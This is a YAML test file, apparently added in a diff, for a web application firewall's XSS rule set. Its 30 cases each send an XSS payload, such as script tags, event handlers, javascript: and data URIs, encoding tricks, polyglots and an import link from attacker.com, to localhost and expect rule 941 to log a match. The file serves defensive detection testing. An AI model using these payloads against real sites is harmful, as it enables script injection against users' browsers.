@@ -1,0 +1,371 @@
+---
+meta:
+  author: "Security Engineer"
+  description: "Comprehensive XSS tests for WAF"
+  enabled: true
+  name: "941-xss-comprehensive"
+tests:
+  - test_id: 941100
+    desc: Basic reflected XSS
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<script>alert(1)</script>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941101
+    desc: IMG tag with onerror
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<img src=x onerror=alert(1)>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941102
+    desc: SVG-based XSS
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<svg onload=alert(1)>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941103
+    desc: Event handler onmouseover
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          uri: /
+          headers:
+            Host: localhost
+            Content-Type: application/x-www-form-urlencoded
+          data: payload=<b onmouseover=alert(1)>test</b>
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941104
+    desc: Event handler onfocus
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<input autofocus onfocus=alert(1)>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941105
+    desc: Event handler onblur
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<input onblur=alert(1)>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941106
+    desc: Event handler oninput
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<input oninput=alert(1)>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941107
+    desc: Event handler onchange
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<input onchange=alert(1)>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941108
+    desc: Event handler ontoggle
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<details ontoggle=alert(1)>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941109
+    desc: JavaScript pseudo-protocol
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<a href="javascript:alert(1)">link</a>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941110
+    desc: Data URI XSS
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<iframe src="data:text/html,<script>alert(1)</script>">
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941111
+    desc: HTML entity encoding
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941112
+    desc: Unicode escape
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=\u003cscript\u003ealert(1)\u003c/script\u003e
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941113
+    desc: Template literal XSS
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=${alert(1)}
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941114
+    desc: Mutation XSS
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          uri: /
+          headers:
+            Host: localhost
+            Content-Type: application/x-www-form-urlencoded
+          data: p=<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941115
+    desc: DOM clobbering attacks
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<a id=DOMPurify><a id=DOMPurify name=isSupported>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941116
+    desc: Polyglot XSS payloads
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941117
+    desc: CSS expression XSS
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<div style="x:expression(alert(1))">
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941118
+    desc: SVG animate/set XSS
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941119
+    desc: MathML XSS
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<math><mi xlink:href="data:x,<script>alert(1)</script>"></mi></math>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941120
+    desc: Form action XSS
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<form action="javascript:alert(1)"><input type=submit>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941121
+    desc: Base tag injection
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<base href="javascript://">
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941122
+    desc: Link tag injection
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<link rel="import" href="http://attacker.com/xss.html">
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941123
+    desc: Meta refresh XSS
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941124
+    desc: Object/embed/applet tag XSS
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<object data="data:text/html,<script>alert(1)</script>">
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941125
+    desc: IFrame srcdoc XSS
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941126
+    desc: Details/summary tag XSS
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<details open ontoggle="alert(1)"><summary>x</summary></details>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941127
+    desc: Marquee/video/audio tag XSS
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<video><source onerror="alert(1)">
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941128
+    desc: Double encoding XSS
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
+  - test_id: 941129
+    desc: Backtick XSS
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: /?q=<script>alert`1`</script>
+          headers:
+            Host: localhost
+        output:
+          log_contains: "id \"941\""
